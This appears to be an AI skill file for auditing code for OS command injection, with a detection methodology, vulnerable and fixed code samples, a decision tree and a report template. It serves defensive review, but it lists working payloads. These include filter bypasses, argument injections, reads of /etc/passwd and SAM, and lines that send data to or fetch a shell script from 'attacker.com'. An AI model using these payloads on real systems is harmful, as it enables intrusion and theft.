---
name: command-injection-audit
description: Detection methodology for OS command injection vulnerabilities
---

# Domain Expertise

# OS Command Injection Auditor

## Expertise

You are a command injection specialist with deep knowledge of shell parsing, process spawning mechanisms, and operating system command execution. You understand the nuances between different shells (bash, sh, cmd, PowerShell), how arguments are parsed, and the subtle ways user input can escape intended contexts. Your expertise spans Unix and Windows environments, including their unique command separators and escape sequences.

## Core Proficiency

- **Shell parsing hazards**: Metacharacter interpretation, quoting rules
- **Argument vector safety**: Difference between shell execution and direct exec
- **Environment variable risks**: Injection via environment manipulation
- **Cross-platform considerations**: Unix vs Windows command syntax

## Focus Areas

### subprocess with shell=True
```python
# VULNERABLE: shell=True enables metacharacter interpretation
subprocess.call(f"ping -c 3 {host}", shell=True)

# VULNERABLE: Even with list, shell=True is dangerous
subprocess.Popen(["sh", "-c", f"nslookup {domain}"], shell=True)

# SAFE: shell=False with argument list
subprocess.call(["ping", "-c", "3", host], shell=False)
```

### os.system(), os.popen()
```python
# VULNERABLE: Always uses shell
os.system(f"convert {input_file} {output_file}")

# VULNERABLE: Shell command with user input
os.popen(f"grep '{pattern}' /var/log/app.log").read()

# VULNERABLE: Commands module (Python 2)
commands.getoutput(f"file {filename}")
```

### Backtick Execution
```ruby
# Ruby backticks
result = `ls #{directory}`

# Ruby system with interpolation
system("tar -czf backup.tar.gz #{path}")

# Perl backticks
my $output = `cat $filename`;

# PHP shell execution
$output = shell_exec("whois $domain");
$output = `dig $domain`;
```

### Argument Injection (--flag injection)
```python
# Even without shell, arguments can be injected
# VULNERABLE: Attacker controls filename
subprocess.call(["git", "clone", user_repo_url])
# Attack: user_repo_url = "--upload-pack=id" or "-c protocol.ext.allow=always"

# VULNERABLE: Tar argument injection
subprocess.call(["tar", "-xf", filename, "-C", extract_path])
# Attack: filename = "--checkpoint=1 --checkpoint-action=exec=sh shell.sh"
```

### Environment Variable Injection
```python
# VULNERABLE: User controls environment
env = os.environ.copy()
env['CONFIG_PATH'] = user_input  # Could contain shell metacharacters
subprocess.call(["./script.sh"], env=env, shell=True)

# VULNERABLE: LD_PRELOAD injection
env['LD_PRELOAD'] = user_input  # Library injection

# VULNERABLE: PATH manipulation
env['PATH'] = f"{user_dir}:{os.environ['PATH']}"
```

## Red Flags and Warning Signs

1. **shell=True**: Any subprocess call with shell=True
2. **os.system/popen**: These always invoke shell
3. **String formatting in commands**: f-strings, .format(), % in command strings
4. **Backticks**: Ruby ``, Perl ``, PHP ``
5. **exec functions**: PHP exec(), shell_exec(), passthru(), system()
6. **User-controlled filenames**: Especially with commands that accept flags
7. **URL/path in commands**: wget, curl, git clone with user URLs
8. **Archive operations**: tar, unzip with user-controlled archives

## Attack Patterns

### Command Chaining (;, &&, ||)
```bash
# Semicolon - execute regardless of success
ping -c 1 127.0.0.1; cat /etc/passwd

# AND - execute if first succeeds
ping -c 1 127.0.0.1 && cat /etc/passwd

# OR - execute if first fails
ping -c 1 invalid || cat /etc/passwd

# Windows equivalents
ping 127.0.0.1 & type C:\Windows\System32\config\SAM
ping 127.0.0.1 && type secret.txt
```

### Command Substitution
```bash
# Bash command substitution
ping -c 1 $(cat /etc/passwd | base64 | curl -d @- attacker.com)

# Backtick substitution
ping -c 1 `id`

# PowerShell
ping $(whoami)
```

### Newline Injection
```bash
# Newline creates new command
127.0.0.1%0aid%0acat /etc/passwd

# Carriage return (Windows)
127.0.0.1%0d%0adir
```

### Argument Injection Bypassing Filters
```bash
# Git argument injection
--upload-pack='touch /tmp/pwned'
-c protocol.ext.allow=always --upload-pack='id'

# Tar arbitrary file write
--to-command='sh -c "id > /tmp/pwned"'
--checkpoint=1 --checkpoint-action=exec=sh shell.sh

# SSH argument injection
-o ProxyCommand='touch /tmp/pwned'

# Curl argument injection
-o /tmp/pwned http://attacker.com/payload
```

### Filter Bypass Techniques
```bash
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Keyword bypass
/???/??t /???/p??s??  # /bin/cat /etc/passwd
$(printf '\x63\x61\x74') /etc/passwd

# Quote bypass
c""at /etc/passwd
c''at /etc/passwd
c\at /etc/passwd
```

## Analysis Methodology

1. **Identify command execution**: Find all shell/subprocess calls
2. **Trace input flow**: Map user data to command arguments
3. **Check shell flag**: shell=True is almost always vulnerable
4. **Review argument construction**: String concat vs argument arrays
5. **Audit environment variables**: User-controlled env vars
6. **Examine filenames**: User-controlled files passed to commands
7. **Test for argument injection**: Even without shell, --flag attacks work
8. **Review wrapper scripts**: Shell scripts called from application

## Common Protection Bypasses

### Blacklist Bypass
```bash
# If ; is blocked
127.0.0.1%0aid      # Newline
127.0.0.1|id        # Pipe
127.0.0.1||id       # OR
$(id)               # Substitution

# If spaces are blocked
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
```

### Quote Escape
```bash
# If input is quoted
'; cat /etc/passwd #
`cat /etc/passwd`
$(cat /etc/passwd)
```

### Path Traversal in Commands
```bash
# Bypass restricted directory
../../../../../../etc/passwd
/var/www/html/images/../../../etc/passwd
```

## Example Vulnerable Code

### Example 1: Image Processing
```python
# image_handler.py - Vulnerable image conversion
from flask import Flask, request
import subprocess

@app.route('/convert', methods=['POST'])
def convert_image():
    filename = request.form['filename']
    output_format = request.form['format']

    # VULNERABLE: Shell injection via filename
    subprocess.call(
        f"convert uploads/{filename} output.{output_format}",
        shell=True
    )
    return "Converted successfully"

# Attack: filename = "image.jpg; cat /etc/passwd > /var/www/html/leaked.txt"
```

### Example 2: Git Operations
```python
# git_service.py - Vulnerable git clone
def clone_repository(repo_url):
    # VULNERABLE: Argument injection even without shell=True
    subprocess.run(
        ["git", "clone", repo_url, "/tmp/repo"],
        check=True
    )

# Attack: repo_url = "--upload-pack=touch${IFS}/tmp/pwned ext::sh -c touch% /tmp/pwned"
```

### Example 3: PDF Generation
```javascript
// pdf.js - Vulnerable PDF generation with wkhtmltopdf
const { exec } = require('child_process');

app.post('/generate-pdf', (req, res) => {
    const url = req.body.url;
    const output = `/tmp/${Date.now()}.pdf`;

    // VULNERABLE: Command injection via url
    exec(`wkhtmltopdf ${url} ${output}`, (error, stdout, stderr) => {
        if (error) {
            return res.status(500).send('Error generating PDF');
        }
        res.sendFile(output);
    });
});

// Attack: url = "http://example.com; curl http://attacker.com/shell.sh | sh"
```

## Output Format

```markdown
## Command Injection Finding

**Location**: [file:line]
**Severity**: Critical
**Confidence**: High/Medium/Low

**Vulnerable Code**:
[code block]

**Injection Point**: [parameter/variable name]
**Shell Type**: [bash/sh/cmd/PowerShell]
**Execution Method**: [subprocess/os.system/exec/backticks]

**Attack Vector**:
```
[Specific payload]
```

**Impact**:
- Remote code execution: Yes
- File system access: [Read/Write/Both]
- Network access: [Yes/No]
- Privilege level: [user/root/www-data]

**Proof of Concept**:
```bash
curl -X POST http://target/endpoint \
  -d 'param=value; id; cat /etc/passwd'
```

**Remediation**:
1. Use subprocess with shell=False and argument list
2. Implement strict input validation (whitelist)
3. Use shlex.quote() for shell escaping if shell is required
4. Avoid user input in commands entirely where possible
```

---

# Detection Methodology

# Command Injection Detection

## Methodology

### Step 1: Identify Command Execution Points

Search for all locations where system commands are executed:

**Python:**
- `os.system()`, `os.popen()`
- `subprocess.run()`, `subprocess.Popen()`, `subprocess.call()`, `subprocess.check_output()`
- `subprocess.getstatusoutput()`, `subprocess.getoutput()`
- `commands.getstatusoutput()` (Python 2)
- `eval()`, `exec()` (code execution, not OS commands, but same risk class)

**Node.js:**
- `child_process.exec()`, `child_process.execSync()`
- `child_process.spawn()` (safer if used correctly — see below)
- `child_process.execFile()` (safer — no shell by default)
- Template literals in `exec()`: `` exec(`cmd ${userInput}`) ``

**Ruby:**
- Backticks: `` `#{user_input}` ``
- `system()`, `exec()`, `%x{}`
- `IO.popen()`, `Open3.capture2()`
- `Kernel.send(:`, ...)` with dynamic method names

**Go:**
- `exec.Command()` with shell: `exec.Command("sh", "-c", userInput)`
- `exec.Command()` without shell (safer but still check args)

**Java:**
- `Runtime.getRuntime().exec()`
- `ProcessBuilder`
- `javax.script.ScriptEngine.eval()`

**Rust:**
- `std::process::Command::new("sh").arg("-c").arg(user_input)`
- `std::process::Command::new(user_input)` (command name itself is user-controlled)

### Step 2: Determine Shell Involvement

The critical distinction: **does the command go through a shell interpreter?**

**Through shell (DANGEROUS — metacharacters interpreted):**
```python
os.system(f"ping {host}")                           # Always shell
subprocess.run(f"ping {host}", shell=True)           # Explicit shell=True
subprocess.run(["sh", "-c", f"ping {host}"])         # Manual shell invocation
```

**No shell (SAFER — but still check arguments):**
```python
subprocess.run(["ping", host])                       # No shell, args are list
subprocess.run(["ping", "-c", "4", host], shell=False)  # Explicit shell=False
```

Without a shell, metacharacters like `;`, `|`, `&&`, `` ` ``, `$()` are NOT interpreted. But the command can still be abused if:
- The command itself has dangerous flags (e.g., `tar --checkpoint-action=exec=...`)
- The argument is a file path with traversal (e.g., `cat ../../etc/passwd`)
- The binary name is user-controlled

### Step 3: Trace Input Source

For each command execution point:

1. **Is any part of the command string user-controlled?**
   - Command name → Critical (arbitrary command execution)
   - Arguments → High if through shell, Medium if no shell
   - Environment variables → Medium (some commands respect env vars for config)

2. **What sanitization exists?**
   - `shlex.quote()` / `shellescape` → Generally safe for shell contexts
   - Regex filtering → Fragile (check for bypass via encoding, newlines)
   - Allowlist of commands → Safe if enforced correctly
   - Path validation → Partial defense (prevents traversal, not injection)

### Step 4: Check for Indirect Command Injection

1. **Filename-based injection**: User uploads file with name like `; rm -rf /; .txt`, system processes it with shell commands
2. **Environment variable injection**: User controls env vars that affect command behavior (e.g., `LD_PRELOAD`, `PATH`, `GIT_SSH_COMMAND`)
3. **Argument injection**: Even without shell, some programs interpret arguments dangerously:
   - `git` with `--upload-pack` flag
   - `curl` with `-o` flag (write to arbitrary file)
   - `tar` with `--checkpoint-action` (execute arbitrary commands)
   - `find` with `-exec` (execute commands)
   - `rsync` with `-e` (specify remote shell)

### Step 5: Classify

- **VULNERABLE (Critical)**: User input in shell command string, unauthenticated endpoint
- **VULNERABLE (High)**: User input in shell command, requires authentication
- **VULNERABLE (High)**: User controls command name (even without shell)
- **HARDENED (Medium)**: Argument injection risk (no shell, but dangerous program flags)
- **HARDENED (Low)**: User input in command but `shlex.quote()` applied (check for edge cases)
- **SAFE**: No user input in command, or input is from trusted internal source
- **BY_DESIGN**: Admin-only command execution (still note it — admin compromise = full RCE)

## Decision Tree

```
Is a system command executed with any external data?
├── No → SAFE
└── Yes → Does the command go through a shell?
    ├── Yes → Is the external data user-controlled?
    │   ├── No → SAFE (but note: config-sourced data could be tampered)
    │   └── Yes → Is the input sanitized?
    │       ├── shlex.quote() or equivalent → HARDENED (Low — check edge cases)
    │       ├── Regex/blocklist → HARDENED (Medium — bypass risk)
    │       ├── Allowlist → SAFE (verify allowlist)
    │       └── No sanitization → VULNERABLE (Critical/High based on auth)
    └── No (array form) → Is the command name user-controlled?
        ├── Yes → VULNERABLE (High — arbitrary binary execution)
        └── No → Are arguments user-controlled?
            ├── No → SAFE
            └── Yes → Is the program known to have dangerous flags?
                ├── Yes (git, tar, curl, find, rsync) → HARDENED (Medium)
                └── No → SAFE (but document for completeness)
```

## Real-World Examples

### Example 1: Node.js exec with User Input

**Vulnerable pattern:**
```javascript
const { exec } = require('child_process');

app.get('/lookup', (req, res) => {
    const domain = req.query.domain;
    exec(`nslookup ${domain}`, (error, stdout, stderr) => {
        res.send(stdout);
    });
});
```

**Why vulnerable:** `domain` comes directly from query parameter. Attacker sends `domain=example.com; cat /etc/passwd` and the shell interprets the semicolon as a command separator.

**Impact:** Full RCE as the Node.js process user.

**Fix:**
```javascript
const { execFile } = require('child_process');

app.get('/lookup', (req, res) => {
    const domain = req.query.domain;
    // Validate: domain should only contain alphanumeric, dots, hyphens
    if (!/^[a-zA-Z0-9.-]+$/.test(domain)) {
        return res.status(400).send('Invalid domain');
    }
    execFile('nslookup', [domain], (error, stdout, stderr) => {
        res.send(stdout);
    });
});
```

### Example 2: Python Argument Injection via Git

**Vulnerable pattern:**
```python
def clone_repo(repo_url: str, dest: str):
    # No shell=True, looks safe...
    subprocess.run(["git", "clone", repo_url, dest], check=True)
```

**Why vulnerable:** Even without shell, `git clone` accepts `--upload-pack` which specifies a command to run. Attacker provides:
```
repo_url = "--upload-pack=touch /tmp/pwned"
```
Git executes `touch /tmp/pwned` as part of the clone process.

**Fix:**
```python
def clone_repo(repo_url: str, dest: str):
    # Validate URL format
    if not repo_url.startswith(("https://", "git@")):
        raise ValueError("Invalid repo URL")
    # Use -- to prevent argument interpretation
    subprocess.run(["git", "clone", "--", repo_url, dest], check=True)
```

### Example 3: False Positive — Internal Tooling with Hardcoded Commands

```python
def restart_service(service_name: str):
    ALLOWED_SERVICES = {"web", "worker", "scheduler"}
    if service_name not in ALLOWED_SERVICES:
        raise ValueError(f"Unknown service: {service_name}")
    # Safe: service_name is from a strict allowlist
    subprocess.run(["systemctl", "restart", f"myapp-{service_name}"], check=True)
```

**Why safe:** `service_name` is validated against a strict allowlist of 3 values. The final command can only be one of `systemctl restart myapp-web`, `myapp-worker`, or `myapp-scheduler`. No shell is involved, and no user-controlled data reaches the arguments unvalidated.

## Common False Positive Patterns

1. **No shell, hardcoded command**: `subprocess.run(["ls", "-la", "/var/log"])` — no user input
2. **Allowlisted input**: User selects from dropdown, server validates against fixed set
3. **Build/CI scripts**: Commands in Dockerfiles, Makefiles, CI configs — not user-facing at runtime
4. **Test helpers**: `subprocess.run(["pytest", ...])` in test fixtures
5. **`execFile` / `spawn` with validated args**: No shell involved, arguments are not metacharacter-sensitive
